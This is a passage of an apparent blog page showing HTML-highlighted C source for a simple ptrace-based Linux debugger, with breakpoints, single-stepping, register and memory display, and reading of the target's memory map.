class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/reg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">ERR</span>&#123;</span></span><br><span class="line">    NOL,</span><br><span class="line">    INPUT_ERR,</span><br><span class="line">    FORK_ERR,</span><br><span class="line">    MALLOC_ERR,</span><br><span class="line">    OPEN_ERR,</span><br><span class="line">    NOTFIND_ERR,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> word_size = <span class="keyword">sizeof</span>(<span class="keyword">size_t</span>);</span><br><span class="line"><span class="keyword">char</span> breakcode[] = &#123;<span class="number">0xcd</span>,<span class="number">0x80</span>,<span class="number">0xcc</span>,<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">breakinfo</span>&#123;</span></span><br><span class="line">    <span class="keyword">size_t</span> addr;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">breakinfo</span>* <span class="title">next</span>;</span></span><br><span class="line">    <span class="keyword">char</span> backcode[<span class="number">9</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">breakinfohead</span>&#123;</span></span><br><span class="line">    <span class="keyword">size_t</span> total;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">breakinfo</span>* <span class="title">next</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">breakinfohead</span>* <span class="title">bh</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">hex2int</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* str)</span></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> mm[<span class="number">128</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    mm[<span class="string">&#x27;0&#x27;</span>]=<span class="number">0</span>; mm[<span class="string">&#x27;1&#x27;</span>]=<span class="number">1</span>; mm[<span class="string">&#x27;2&#x27;</span>]=<span class="number">2</span>; mm[<span class="string">&#x27;3&#x27;</span>]=<span class="number">3</span>; mm[<span class="string">&#x27;4&#x27;</span>]=<span class="number">4</span>;</span><br><span class="line">    mm[<span class="string">&#x27;5&#x27;</span>]=<span class="number">5</span>; mm[<span class="string">&#x27;6&#x27;</span>]=<span class="number">6</span>; mm[<span class="string">&#x27;7&#x27;</span>]=<span class="number">7</span>; mm[<span class="string">&#x27;8&#x27;</span>]=<span class="number">8</span>; mm[<span class="string">&#x27;9&#x27;</span>]=<span class="number">9</span>;</span><br><span class="line">    mm[<span class="string">&#x27;a&#x27;</span>]=<span class="number">10</span>; mm[<span class="string">&#x27;b&#x27;</span>]=<span class="number">11</span>; mm[<span class="string">&#x27;c&#x27;</span>]=<span class="number">12</span>; mm[<span class="string">&#x27;d&#x27;</span>]=<span class="number">13</span>; mm[<span class="string">&#x27;e&#x27;</span>]=<span class="number">14</span>; mm[<span class="string">&#x27;f&#x27;</span>]=<span class="number">15</span>;</span><br><span class="line">    mm[<span class="string">&#x27;A&#x27;</span>]=<span class="number">10</span>; mm[<span class="string">&#x27;B&#x27;</span>]=<span class="number">11</span>; mm[<span class="string">&#x27;C&#x27;</span>]=<span class="number">12</span>; mm[<span class="string">&#x27;D&#x27;</span>]=<span class="number">13</span>; mm[<span class="string">&#x27;E&#x27;</span>]=<span class="number">14</span>; mm[<span class="string">&#x27;F&#x27;</span>]=<span class="number">15</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(str==<span class="literal">NULL</span>) </span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (*str)&#123;</span><br><span class="line">        ans*=<span class="number">16</span>;</span><br><span class="line">        ans+=mm[*str];</span><br><span class="line">        str++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">errPrint</span><span class="params">(<span class="keyword">char</span> * msg)</span></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">msgPrint</span><span class="params">(<span class="keyword">char</span> * msg)</span></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(msg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bytePrint</span><span class="params">(<span class="keyword">char</span>* codes, <span class="keyword">int</span> len)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; ++i) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02x &quot;</span>, (<span class="keyword">unsigned</span> <span class="keyword">char</span>) codes[i]);</span><br><span class="line">        <span class="keyword">if</span> ((i + <span class="number">1</span>) % <span class="number">8</span> == <span class="number">0</span>)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">putdata</span><span class="params">(<span class="keyword">pid_t</span> pid, <span class="keyword">size_t</span> addr, <span class="keyword">char</span> *str, <span class="keyword">int</span> len)</span> </span>&#123;   </span><br><span class="line">    <span class="keyword">char</span> *code;</span><br><span class="line">    <span class="keyword">int</span> i, j;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">u</span>&#123;</span></span><br><span class="line">        <span class="keyword">size_t</span> val;</span><br><span class="line">        <span class="keyword">char</span> word[word_size];</span><br><span class="line">    &#125;data;</span><br><span class="line">    i = <span class="number">0</span>;</span><br><span class="line">    j = len / word_size;</span><br><span class="line">    code = str;</span><br><span class="line">    <span class="keyword">while</span>(i &lt; j) &#123;</span><br><span class="line">        <span class="built_in">memcpy</span>(data.word, code, word_size);</span><br><span class="line">        ptrace(PTRACE_POKEDATA, pid, addr + i * <span class="number">8</span>, data.val);</span><br><span class="line">        ++i;</span><br><span class="line">        code += word_size;</span><br><span class="line">    &#125;</span><br><span class="line">    j = len % word_size;</span><br><span class="line">    <span class="keyword">if</span>(j != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">memcpy</span>(data.word, code, j);</span><br><span class="line">        ptrace(PTRACE_POKEDATA, pid, addr + i * <span class="number">8</span>, data.val);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getdata</span><span class="params">(<span class="keyword">pid_t</span> pid, <span class="keyword">size_t</span> addr, <span class="keyword">char</span>* str, <span class="keyword">int</span> len)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *code;</span><br><span class="line">    <span class="keyword">int</span> i, j;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">u</span>&#123;</span></span><br><span class="line">        <span class="keyword">size_t</span> val;</span><br><span class="line">        <span class="keyword">char</span> word[word_size];</span><br><span class="line">    &#125;data;</span><br><span class="line">    i = <span class="number">0</span>;</span><br><span class="line">    j = len / word_size;</span><br><span class="line">    code = str;</span><br><span class="line">    <span class="keyword">while</span> (i &lt; j) &#123;</span><br><span class="line">        data.val = ptrace(PTRACE_PEEKDATA, pid, addr + i * <span class="number">8</span>, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="built_in">memcpy</span>(code, data.word, word_size);</span><br><span class="line">        ++i;</span><br><span class="line">        code += word_size;</span><br><span class="line">    &#125;</span><br><span class="line">    j = len % word_size;</span><br><span class="line">    <span class="keyword">if</span> (j != <span class="number">0</span>) &#123;</span><br><span class="line">        data.val = ptrace(PTRACE_PEEKDATA, pid, addr + i * <span class="number">8</span>, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="built_in">memcpy</span>(code, data.word, j);</span><br><span class="line">    &#125;</span><br><span class="line">    str[len] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">showReg</span><span class="params">(<span class="keyword">pid_t</span> child, <span class="keyword">int</span> key)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(child==<span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> -FORK_ERR;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_regs_struct</span> <span class="title">regs</span>;</span></span><br><span class="line">    ptrace(PTRACE_GETREGS, child, <span class="number">0</span>, &amp;regs); </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;───────────────────────────────[ REGISTERS ]──────────────────────────────────\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;rax:\t%llx\nrbx:\t%llx\nrcx:\t%llx\nrdx:\t%llx\nrsi:\t%llx\nrdi:\t%llx\nrbp:\t%llx\n&quot;</span></span><br><span class="line">        <span class="string">&quot;rsp:\t%llx\nrip:\t%llx\neflags:\t%llx\ncs:\t%llx\nss:\t%llx\nds:\t%llx\nes:\t%llx\n&quot;</span>,</span><br><span class="line">        regs.rax, regs.rbx, regs.rcx, regs.rdx, regs.rsi, regs.rdi, regs.rbp,</span><br><span class="line">        regs.rsp, regs.rip, regs.eflags, regs.cs, regs.ss, regs.ds, regs.es);</span><br><span class="line">    <span class="keyword">if</span>(key == <span class="number">1</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;──────────────────────────────────────────────────────────────────────────────\n&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">showCode</span><span class="params">(<span class="keyword">pid_t</span> child, <span class="keyword">int</span> key)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(child==<span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> -FORK_ERR;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">char</span> code[<span class="number">0x40</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_regs_struct</span> <span class="title">regs</span>;</span></span><br><span class="line">    ptrace(PTRACE_GETREGS, child, <span class="number">0</span>, &amp;regs); </span><br><span class="line">    getdata(child,regs.rip,code,<span class="number">0x40</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;───────────────────────────────[ CODE BYTES ]─────────────────────────────────\n&quot;</span>);</span><br><span class="line">    bytePrint(code,<span class="number">0x40</span>); </span><br><span class="line">    <span class="keyword">if</span>(key == <span class="number">1</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;──────────────────────────────────────────────────────────────────────────────\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">showMemory</span><span class="params">(<span class="keyword">pid_t</span> child)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(child==<span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> -FORK_ERR;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">char</span> code[<span class="number">0x40</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">size_t</span> addr;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_regs_struct</span> <span class="title">regs</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%lx&quot;</span>,&amp;addr);</span><br><span class="line">    getchar();</span><br><span class="line">    ptrace(PTRACE_GETREGS, child, <span class="number">0</span>, &amp;regs); </span><br><span class="line">    getdata(child,addr,code,<span class="number">0x40</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;──────────────────────────────────────────────────────────────────────────────\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;search in %lx:\n&quot;</span>,addr);</span><br><span class="line">    bytePrint(code,<span class="number">0x40</span>); </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;──────────────────────────────────────────────────────────────────────────────\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">inputLine</span><span class="params">(<span class="keyword">char</span> *cmd)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(cmd == <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> -INPUT_ERR;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">char</span> tmp[<span class="number">0x40</span>];</span><br><span class="line">    <span class="keyword">char</span> ch;</span><br><span class="line">    <span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        ch = getchar();</span><br><span class="line">        <span class="keyword">if</span>(ch == <span class="string">&#x27;\n&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(i == <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            tmp[i]=<span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        tmp[i++] = ch;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">strcpy</span>(cmd,tmp);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">setBreak</span><span class="params">(<span class="keyword">pid_t</span> child)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(child==<span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> -FORK_ERR;</span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">breakinfo</span>* <span class="title">bk</span> =</span> (struct breakinfo*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct breakinfo));</span><br><span class="line">    <span class="keyword">if</span>(bk==<span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> -MALLOC_ERR;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">size_t</span> addr;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%lx&quot;</span>,&amp;addr);</span><br><span class="line">    getchar();</span><br><span class="line">    bk-&gt;addr = addr;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;break at :0x%lx\n&quot;</span>,bk-&gt;addr);</span><br><span class="line">    getdata(child, addr, bk-&gt;backcode, <span class="number">8</span>);</span><br><span class="line">    bytePrint(bk-&gt;backcode,<span class="number">8</span>);</span><br><span class="line">    putdata(child, addr, breakcode, <span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">    bk-&gt;next = bh-&gt;next;</span><br><span class="line">    bh-&gt;next = bk;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">searchBreak</span><span class="params">(<span class="keyword">pid_t</span> child,<span class="keyword">size_t</span> addr,struct breakinfo** bkp)</span></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">breakinfo</span>* <span class="title">tmp</span>=</span>bh-&gt;next;</span><br><span class="line">    <span class="keyword">while</span>(tmp!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(addr == tmp-&gt;addr)&#123;</span><br><span class="line">            *bkp = tmp;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        tmp = tmp-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    msgPrint(<span class="string">&quot;Miss Breakpoint&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> -NOTFIND_ERR;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">unlinkBreak</span><span class="params">(<span class="keyword">pid_t</span> child,struct breakinfo** bkp)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(*bkp == <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> -INPUT_ERR;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">breakinfo</span>* <span class="title">tmp</span>=</span>bh-&gt;next;</span><br><span class="line">    <span class="keyword">if</span>(*bkp == bh-&gt;next)&#123;</span><br><span class="line">        bh-&gt;next = bh-&gt;next-&gt;next;</span><br><span class="line">        <span class="built_in">free</span>(*bkp);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(tmp-&gt;next!=*bkp)&#123;</span><br><span class="line">        tmp = tmp-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    tmp-&gt;next = tmp-&gt;next-&gt;next;</span><br><span class="line">    <span class="built_in">free</span>(*bkp);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">showBreak</span><span class="params">(<span class="keyword">pid_t</span> child)</span></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">breakinfo</span> *<span class="title">tmp</span> =</span> bh-&gt;next;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(tmp!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Break addr = 0x%lx\n&quot;</span>,tmp-&gt;addr);</span><br><span class="line">        bytePrint(tmp-&gt;backcode,<span class="number">8</span>);</span><br><span class="line">        tmp = tmp-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">runBreak</span><span class="params">(<span class="keyword">pid_t</span> child, <span class="keyword">int</span> status)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(child==<span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> -FORK_ERR;</span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_regs_struct</span> <span class="title">regs</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">breakinfo</span> *<span class="title">bk</span>;</span></span><br><span class="line">    <span class="keyword">if</span> (WIFEXITED(status))&#123;</span><br><span class="line">        msgPrint(<span class="string">&quot;Process finished&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (WSTOPSIG(status) == SIGTRAP) &#123;  </span><br><span class="line">        ptrace(PTRACE_GETREGS, child, <span class="number">0</span>, &amp;regs);  </span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(searchBreak(child,regs.rip<span class="number">-3</span>,&amp;bk) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> -NOTFIND_ERR;</span><br><span class="line">        &#125;</span><br><span class="line">        putdata(child, bk-&gt;addr, bk-&gt;backcode, <span class="number">8</span>);</span><br><span class="line">        ptrace(PTRACE_SETREGS, child, <span class="number">0</span>, &amp;regs);</span><br><span class="line">        regs.rip = bk-&gt;addr;</span><br><span class="line">        ptrace(PTRACE_SETREGSET, child, <span class="number">0</span>, &amp;regs);</span><br><span class="line">        ptrace(PTRACE_SETREGS, child, <span class="number">0</span>, &amp;regs);</span><br><span class="line">        showReg(child,<span class="number">0</span>);</span><br><span class="line">        showCode(child,<span class="number">1</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Hit Breakpoint at: 0x%lx\n&quot;</span>, bk-&gt;addr);</span><br><span class="line">        unlinkBreak(child, &amp;bk);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">runStepIn</span><span class="params">(<span class="keyword">pid_t</span> child)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(child==<span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> -FORK_ERR;</span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">int</span> status;</span><br><span class="line">    showReg(child,<span class="number">0</span>);</span><br><span class="line">    showCode(child,<span class="number">1</span>);</span><br><span class="line">    ptrace(PTRACE_SINGLESTEP, child, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    wait(&amp;status);</span><br><span class="line">    <span class="keyword">if</span> (WIFEXITED(status))&#123;</span><br><span class="line">        msgPrint(<span class="string">&quot;Process finished&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getBase</span><span class="params">(<span class="keyword">pid_t</span> child,<span class="keyword">size_t</span>* probase,<span class="keyword">size_t</span>* libcbase)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(child==<span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> -FORK_ERR;</span><br><span class="line">    &#125;    </span><br><span class="line">    <span class="keyword">int</span> fd;</span><br><span class="line">    <span class="keyword">char</span> path[<span class="number">0x40</span>];</span><br><span class="line">    <span class="keyword">char</span> cmd[<span class="number">0x50</span>];</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x40</span>];</span><br><span class="line">    <span class="keyword">char</span> *ret;</span><br><span class="line">    <span class="built_in">sprintf</span>(path,<span class="string">&quot;/proc/%d/maps&quot;</span>,child);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Path: %s\n&quot;</span>,path);</span><br><span class="line">    <span class="built_in">sprintf</span>(cmd,<span class="string">&quot;cat %s&quot;</span>,path);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;───────────────────────────────[ VMA MAP ]───────────────────────────────────\n&quot;</span>);</span><br><span class="line">    msgPrint(<span class="string">&quot;LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA&quot;</span>);</span><br><span class="line">    system(cmd);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;──────────────────────────────────────────────────────────────────────────────\n&quot;</span>);</span><br><span class="line">    fd = open(path,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> -OPEN_ERR;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    lseek(fd,<span class="number">0</span>,SEEK_SET);</span><br><span class="line">    read(fd,buf,<span class="number">0x40</span>);</span><br><span class="line">    ret = <span class="built_in">strchr</span>(buf,<span class="string">&#x27;-&#x27;</span>);</span><br><span class="line">    *ret = <span class="string">&#x27;\x00&#x27;</span>;</span><br><span class="line">    *probase = hex2int(buf);</span><br><span class="line">    lseek(fd,<span class="number">0x19c</span>,SEEK_SET);</span><br><span class="line">    read(fd,buf,<span class="number">0x40</span>);</span><br><span class="line">    ret = <span class="built_in">strchr</span>(buf,<span class="string">&#x27;-&#x27;</span>);</span><br><span class="line">    *ret = <span class="string">&#x27;\x00&#x27;</span>;</span><br><span class="line">    *libcbase = hex2int(buf);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;probase: 0x%lx\n&quot;</span>,*probase);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;libcbase: 0x%lx\n&quot;</span>,*libcbase);</span><br><span class="line">    close(fd);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">pid_t</span> child;</span><br><span class="line">    <span class="keyword">int</span> status;</span><br><span class="line">    <span class="keyword">size_t</span> probase;</span><br><span class="line">    <span class="keyword">size_t</span> libcbase;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_regs_struct</span> <span class="title">regs</span>;</span></span><br><span class="line">    <span class="keyword">char</span> cmd[<span class="number">0x40</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(argv[<span class="number">1</span>]==<span class="literal">NULL</span>)&#123;</span><br><span class="line">        errPrint(<span class="string">&quot;need target&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    child = fork();</span><br><span class="line">    <span class="keyword">if</span>(child==<span class="number">0</span>)&#123;</span><br><span class="line">        ptrace(PTRACE_TRACEME,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">        execl(argv[<span class="number">1</span>],argv[<span class="number">1</span>],<span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        getBase(child,&amp;probase,&amp;libcbase);</span><br><span class="line">        bh = (struct breakinfohead*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct breakinfohead));</span><br><span class="line">        <span class="keyword">if</span>(bh==<span class="literal">NULL</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> -MALLOC_ERR;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;YHellow &gt; &quot;</span>);</span><br><span class="line">            inputLine(cmd);</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">strcmp</span>(cmd,<span class="string">&quot;c&quot;</span>) == <span class="number">0</span>)&#123;</span><br><span class="line">                ptrace(PTRACE_CONT, child, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">                wait(&amp;status);</span><br><span class="line">                runBreak(child,status);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">strcmp</span>(cmd,<span class="string">&quot;b&quot;</span>) == <span class="number">0</span> || <span class="built_in">strcmp</span>(cmd,<span class="string">&quot;break&quot;</span>) == <span class="number">0</span>)&#123;</span><br><span class="line">                setBreak(child);</span><br><span class="line">            &#125;  </span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">strcmp</span>(cmd,<span class="string">&quot;b info&quot;</span>) == <span class="number">0</span> || <span class="built_in">strcmp</span>(cmd,<span class="string">&quot;break info&quot;</span>) == <span class="number">0</span>)&#123;</span><br><span class="line">                showBreak(child);</span><br><span class="line">            &#125;                   </span><br><span class="line">            <span class="keyword">else</span> <span 